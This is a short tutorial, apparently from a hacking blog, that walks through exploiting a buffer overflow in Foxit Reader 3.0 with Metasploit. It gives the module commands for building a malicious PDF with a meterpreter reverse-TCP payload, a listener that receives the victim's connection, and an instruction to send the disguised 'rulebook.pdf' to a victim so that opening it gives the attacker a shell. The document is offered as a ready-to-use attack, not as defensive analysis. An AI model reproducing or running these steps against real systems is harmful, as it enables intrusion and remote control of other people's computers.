Hack Windows PC using Foxit Reader 3.0 Open Execute Action Stack Based Buffer Overflow

 This module exploits a buffer overflow in Foxit Reader 3.0 builds 1301 and earlier. Due to the way Foxit Reader handles the input from an “Launch” action, it is possible to cause a stack-based buffer overflow, allowing an attacker to gain arbitrary code execution under the context of the user.
Foxit Reader 3.0
Windows XP SP2


Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/fileformat/foxit_reader_launch
Msf exploit (foxit_reader_launch)>set payload windows/meterpreter/reverse_tcp
Msf exploit (foxit_reader_launch)>set lhost 192.168.1.2 (IP of Local Host)
Msf exploit (foxit_reader_launch)>set filename rulebook.pdf
Msf exploit (foxit_reader_launch)>exploit

After we successfully generate the malicious PDF File, it will stored on your local computer
/root/.msf4/local/rulebook.pdf

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.2
exploit 
Now send your rulebook.pdf files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
